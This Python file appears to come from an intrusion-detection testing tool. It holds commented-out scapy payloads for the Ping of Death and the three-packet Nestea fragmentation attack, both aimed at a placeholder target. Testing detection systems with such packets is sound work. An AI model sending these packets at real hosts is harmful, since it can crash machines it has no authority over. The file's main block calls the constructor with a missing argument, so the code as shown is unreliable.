#!/usr/bin/env python
###
# @author $Author: sebastiendamaye $
# @version $Revision: 14 $
# @lastmodified $Date: 2011-05-28 13:01:56 +0200 (Sat, 28 May 2011) $
#

import configparser

class FragmentedPackets():
    def __init__(self, target, cnf):
        # Read configuration
        self.config = configparser.RawConfigParser()
        self.config.read(cnf)

        self._target = target
        self.payloads = []

    def getPayloads(self):

        ### [TO REMOVE] Ping of death
        # attack from  1996, works on Windows NT/95, Linux <= 2.0.23
        # self.payloads.append([
        #     "Ping of death",
        #     "scapy",
        #     """send(fragment(IP(dst="%target%")/ICMP()/("X"*60000)), verbose=0)""",
        #     "123:"
        #     ])

        ### [TO REMOVE] Nestea attack 1/3
        # attack from 1998, works on Linux 2.0 and 2.1
        # self.payloads.append([
        #     "Nestea Attack 1/3",
        #     "scapy",
        #     """send(IP(dst="%target%", id=42, flags="MF")/UDP()/("X"*10), verbose=0)""",
        #     "123:"
        #     ])
        # ### Nestea attack 2/3
        # self.payloads.append([
        #     "Nestea Attack 2/3",
        #     "scapy",
        #     """send(IP(dst="%target%", id=42, frag=48)/("X"*116), verbose=0)""",
        #     "123:"
        #     ])
        # ### Nestea attack 3/3
        # self.payloads.append([
        #     "Nestea Attack 3/3",
        #     "scapy",
        #     """send(IP(dst="%target%", id=42, flags="MF")/UDP()/("X"*224), verbose=0)""",
        #     "123:"
        #     ])

        return self.payloads

if __name__ == "__main__":
    print(FragmentedPackets("192.168.100.48").getPayloads())
